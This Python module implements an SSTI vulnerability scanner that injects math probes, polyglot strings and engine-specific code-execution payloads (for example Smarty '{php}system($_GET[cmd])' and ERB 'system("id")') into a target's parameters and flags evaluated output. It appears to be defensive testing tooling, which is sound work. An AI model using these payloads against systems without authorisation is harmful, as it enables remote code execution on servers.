"""
VORTEX SSTI (Server-Side Template Injection) Scanner - V19.1
Detects server-side template injection vulnerabilities across 8+ template engines

DETECTION METHODS:
1. Template engine detection (Jinja2, Twig, FreeMarker, Velocity, etc.)
2. Expression injection (mathematical operations)
3. Object access and method invocation
4. File system access attempts
5. Command execution payloads

AUTHORITY COMPLIANCE:
- Produces HEURISTIC_ONLY detections
- Requires AI analysis and system verification
- Final determination by authority enforcer
"""

import logging
import re
import uuid
from typing import List, Dict, Any, Optional
from urllib.parse import quote

from scanners.base import BaseScanner
from domain.models import AssessmentResult
from domain.enums import FindingType, FindingSeverity, VerificationStatus, ConfidenceSource
from core.network import HTTPResponse

logger = logging.getLogger(__name__)


class SSTIScanner(BaseScanner):
    """
    SSTI vulnerability scanner.
    
    Tests for:
    - Template engine detection
    - Expression injection
    - Code execution via templates
    - File system access
    """
    
    # Template engines and their syntax
    TEMPLATE_ENGINES = {
        'jinja2': {
            'math': '{{7*7}}',
            'detection': ['49'],
            'rce': '{{config.__class__.__init__.__globals__}}',
        },
        'twig': {
            'math': '{{7*7}}',
            'detection': ['49'],
            'rce': '{{_self.env.registerUndefinedFilterCallback("system")}}',
        },
        'freemarker': {
            'math': '${7*7}',
            'detection': ['49'],
            'rce': '<#assign ex="freemarker.template.utility.Execute"?new()>',
        },
        'velocity': {
            'math': '#set($x=7*7)$x',
            'detection': ['49'],
            'rce': '#set($s=$class.inspect("java.lang.Runtime"))',
        },
        'erb': {
            'math': '<%= 7*7 %>',
            'detection': ['49'],
            'rce': '<%= system("id") %>',
        },
        'smarty': {
            'math': '{7*7}',
            'detection': ['49'],
            'rce': '{php}system($_GET[cmd]);{/php}',
        },
        'pug': {
            'math': '#{7*7}',
            'detection': ['49'],
            'rce': '#{process.mainModule.require("child_process").exec("id")}',
        },
        'handlebars': {
            'math': '{{7*7}}',
            'detection': ['49'],
            'rce': '{{#with "s" as |string|}}{{#with "e"}}{{lookup string.sub "constructor"}}{{/with}}{{/with}}',
        }
    }
    
    # Mathematical expressions for detection
    MATH_EXPRESSIONS = [
        ('{{7*7}}', ['49']),
        ('${7*7}', ['49']),
        ('<%= 7*7 %>', ['49']),
        ('#{7*7}', ['49']),
        ('{7*7}', ['49']),
        ('[[7*7]]', ['49']),
        ('{{7*\'7\'}}', ['7777777']),
        ('${7*"7"}', ['7777777']),
    ]
    
    # Polyglot payloads
    POLYGLOT_PAYLOADS = [
        '${{<%[%\'"}}%\\.',
        '${7*7}{{7*7}}',
        '<%= 7*7 %>{{7*7}}',
        '#{7*7}${7*7}',
    ]
    
    def __init__(self):
        super().__init__(FindingType.SSTI)
        self.detected_engines: Dict[str, str] = {}
        
    async def scan(self, url: str, **kwargs) -> List[AssessmentResult]:
        """
        Scan URL for SSTI vulnerabilities.
        
        Args:
            url: Target URL
            **kwargs: Optional parameters:
                - params: URL parameters to test
                - data: POST data to test
                - method: HTTP method (default: GET)
        
        Returns:
            List of SSTI vulnerability findings
        """
        findings = []
        self.stats['scans_performed'] += 1
        
        params = kwargs.get('params', {})
        data = kwargs.get('data', {})
        method = kwargs.get('method', 'GET')
        
        try:
            # Test 1: Mathematical expression injection
            math_findings = await self._test_math_expressions(url, params, data, method)
            findings.extend(math_findings)
            
            # Test 2: Polyglot payloads
            polyglot_findings = await self._test_polyglot_payloads(url, params, data, method)
            findings.extend(polyglot_findings)
            
            # Test 3: Template engine specific tests
            if math_findings:
                engine_findings = await self._test_template_engines(url, params, data, method)
                findings.extend(engine_findings)
            
            self.stats['findings_detected'] += len(findings)
        
        except Exception as e:
            logger.error(f"SSTI scan error for {url}: {e}")
        
        return findings
    
    async def _test_math_expressions(self, url: str, params: Dict[str, Any],
                                    data: Dict[str, Any], method: str) -> List[AssessmentResult]:
        """Test mathematical expression injection."""
        findings = []
        
        # Get baseline response
        try:
            baseline = await self.network_client.request(method, url, params=params, data=data)
            self.stats['requests_made'] += 1
        except Exception as e:
            logger.debug(f"Baseline request failed: {e}")
            return findings
        
        # Test each parameter
        test_targets = []
        if params:
            test_targets.extend([('param', k, v) for k, v in params.items()])
        if data:
            test_targets.extend([('data', k, v) for k, v in data.items()])
        
        for target_type, param_name, original_value in test_targets:
            for expression, expected_results in self.MATH_EXPRESSIONS:
                try:
                    # Prepare test request
                    test_params = params.copy() if target_type == 'param' else params
                    test_data = data.copy() if target_type == 'data' else data
                    
                    if target_type == 'param':
                        test_params[param_name] = expression
                    else:
                        test_data[param_name] = expression
                    
                    # Send test request
                    response = await self.network_client.request(
                        method, url, 
                        params=test_params,
                        data=test_data
                    )
                    self.stats['requests_made'] += 1
                    
                    # Check for evaluation
                    for expected in expected_results:
                        if expected in response.body and expected not in baseline.body:
                            confidence = 0.85
                            
                            finding = AssessmentResult(
                                id=uuid.uuid4(),
                                url=url,
                                finding_type=FindingType.SSTI,
                                severity=FindingSeverity.CRITICAL,
                                status=VerificationStatus.DETECTED,
                                heuristic_score=confidence,
                                confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                                evidence=f"Math expression '{expression}' evaluated to '{expected}' in response",
                                vulnerable_parameter=param_name,
                                payload=expression,
                                description=f"Server-Side Template Injection via {param_name}",
                                remediation="Sanitize user input before template rendering or use sandboxed templates"
                            )
                            findings.append(finding)
                            
                            # Store detected engine hint
                            self.detected_engines[url] = self._detect_engine_from_syntax(expression)
                            break
                
                except Exception as e:
                    logger.debug(f"Math expression test error: {e}")
                    continue
        
        return findings
    
    async def _test_polyglot_payloads(self, url: str, params: Dict[str, Any],
                                     data: Dict[str, Any], method: str) -> List[AssessmentResult]:
        """Test polyglot SSTI payloads."""
        findings = []
        
        # Get baseline
        try:
            baseline = await self.network_client.request(method, url, params=params, data=data)
            self.stats['requests_made'] += 1
        except Exception as e:
            logger.debug(f"Baseline request failed: {e}")
            return findings
        
        # Test each parameter with polyglot payloads
        test_targets = []
        if params:
            test_targets.extend([('param', k, v) for k, v in params.items()])
        if data:
            test_targets.extend([('data', k, v) for k, v in data.items()])
        
        for target_type, param_name, original_value in test_targets:
            for payload in self.POLYGLOT_PAYLOADS:
                try:
                    # Prepare test request
                    test_params = params.copy() if target_type == 'param' else params
                    test_data = data.copy() if target_type == 'data' else data
                    
                    if target_type == 'param':
                        test_params[param_name] = payload
                    else:
                        test_data[param_name] = payload
                    
                    # Send test request
                    response = await self.network_client.request(
                        method, url,
                        params=test_params,
                        data=test_data
                    )
                    self.stats['requests_made'] += 1
                    
                    # Check for errors or reflection changes
                    if self._has_template_error(response.body):
                        confidence = 0.70
                        
                        finding = AssessmentResult(
                            id=uuid.uuid4(),
                            url=url,
                            finding_type=FindingType.SSTI,
                            severity=FindingSeverity.HIGH,
                            status=VerificationStatus.DETECTED,
                            heuristic_score=confidence,
                            confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                            evidence=f"Template error triggered by polyglot payload",
                            vulnerable_parameter=param_name,
                            payload=payload,
                            description=f"Possible SSTI via {param_name} (template error detected)",
                            remediation="Sanitize user input before template rendering"
                        )
                        findings.append(finding)
                        break
                
                except Exception as e:
                    logger.debug(f"Polyglot payload test error: {e}")
                    continue
        
        return findings
    
    async def _test_template_engines(self, url: str, params: Dict[str, Any],
                                    data: Dict[str, Any], method: str) -> List[AssessmentResult]:
        """Test specific template engine payloads."""
        findings = []
        
        # Get detected engine or test all
        engines_to_test = []
        if url in self.detected_engines:
            engines_to_test = [self.detected_engines[url]]
        else:
            engines_to_test = list(self.TEMPLATE_ENGINES.keys())
        
        for engine_name in engines_to_test:
            engine_config = self.TEMPLATE_ENGINES[engine_name]
            
            # Test RCE payload
            rce_payload = engine_config['rce']
            
            test_targets = []
            if params:
                test_targets.extend([('param', k, v) for k, v in params.items()])
            if data:
                test_targets.extend([('data', k, v) for k, v in data.items()])
            
            for target_type, param_name, original_value in test_targets:
                try:
                    # Prepare test request
                    test_params = params.copy() if target_type == 'param' else params
                    test_data = data.copy() if target_type == 'data' else data
                    
                    if target_type == 'param':
                        test_params[param_name] = rce_payload
                    else:
                        test_data[param_name] = rce_payload
                    
                    # Send test request
                    response = await self.network_client.request(
                        method, url,
                        params=test_params,
                        data=test_data
                    )
                    self.stats['requests_made'] += 1
                    
                    # Check for RCE indicators
                    rce_indicators = ['root:', 'uid=', 'gid=', '__globals__', 'java.lang']
                    if any(indicator in response.body for indicator in rce_indicators):
                        confidence = 0.90
                        
                        finding = AssessmentResult(
                            id=uuid.uuid4(),
                            url=url,
                            finding_type=FindingType.SSTI,
                            severity=FindingSeverity.CRITICAL,
                            status=VerificationStatus.DETECTED,
                            heuristic_score=confidence,
                            confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                            evidence=f"RCE achieved via {engine_name} template injection",
                            vulnerable_parameter=param_name,
                            payload=rce_payload,
                            description=f"Critical SSTI in {engine_name} template engine",
                            remediation="Immediately disable user input in templates or implement strict sandboxing"
                        )
                        findings.append(finding)
                        break
                
                except Exception as e:
                    logger.debug(f"Engine-specific test error: {e}")
                    continue
        
        return findings
    
    def _detect_engine_from_syntax(self, expression: str) -> str:
        """Detect template engine from expression syntax."""
        if '{{' in expression:
            return 'jinja2/twig/handlebars'
        elif '${' in expression:
            return 'freemarker/jsp'
        elif '<%=' in expression:
            return 'erb/jsp'
        elif '#{' in expression:
            return 'pug/velocity'
        elif expression.startswith('{') and expression.endswith('}'):
            return 'smarty'
        else:
            return 'unknown'
    
    def _has_template_error(self, body: str) -> bool:
        """Check if response contains template error messages."""
        error_indicators = [
            'template', 'syntax error', 'undefined',
            'jinja2', 'twig', 'freemarker', 'velocity',
            'erb', 'smarty', 'handlebars',
            'TemplateSyntaxError', 'UndefinedError',
            'ParseException', 'VelocityException'
        ]
        
        body_lower = body.lower()
        return any(indicator in body_lower for indicator in error_indicators)
    
    def generate_payloads(self, **kwargs) -> List[str]:
        """
        Generate SSTI test payloads.
        
        Returns:
            List of SSTI payloads
        """
        payloads = []
        
        # Add math expressions
        payloads.extend([expr for expr, _ in self.MATH_EXPRESSIONS])
        
        # Add polyglot payloads
        payloads.extend(self.POLYGLOT_PAYLOADS)
        
        # Add engine-specific payloads
        for engine_config in self.TEMPLATE_ENGINES.values():
            payloads.append(engine_config['math'])
            payloads.append(engine_config['rce'])
        
        return payloads
    
    def analyze_response(self, response: HTTPResponse, payload: str) -> Dict[str, Any]:
        """
        Analyze response for SSTI vulnerability indicators.
        
        Args:
            response: HTTP response
            payload: Payload that was sent
        
        Returns:
            Analysis dict with detection results
        """
        detected = False
        confidence = 0.0
        evidence = ""
        
        # Check for mathematical evaluation
        if '7*7' in payload or '7*"7"' in payload or "7*'7'" in payload:
            if '49' in response.body:
                detected = True
                confidence = 0.85
                evidence = "Mathematical expression evaluated in response"
            elif '7777777' in response.body:
                detected = True
                confidence = 0.85
                evidence = "String multiplication evaluated in response"
        
        # Check for template errors
        if self._has_template_error(response.body):
            detected = True
            confidence = max(confidence, 0.65)
            evidence = "Template error detected in response"
        
        # Check for RCE indicators
        rce_indicators = ['root:', 'uid=', 'gid=', '__globals__', 'java.lang']
        if any(indicator in response.body for indicator in rce_indicators):
            detected = True
            confidence = 0.95
            evidence = "RCE indicators found in response"
        
        return {
            'detected': detected,
            'confidence': confidence,
            'evidence': evidence,
            'response_analysis': {
                'status_code': response.status_code,
                'has_template_error': self._has_template_error(response.body),
                'payload_reflected': payload in response.body
            }
        }


# Global scanner instance
global_ssti_scanner: Optional[SSTIScanner] = None


def get_ssti_scanner() -> SSTIScanner:
    """Get or create global SSTI scanner instance."""
    global global_ssti_scanner
    
    if global_ssti_scanner is None:
        global_ssti_scanner = SSTIScanner()
    
    return global_ssti_scanner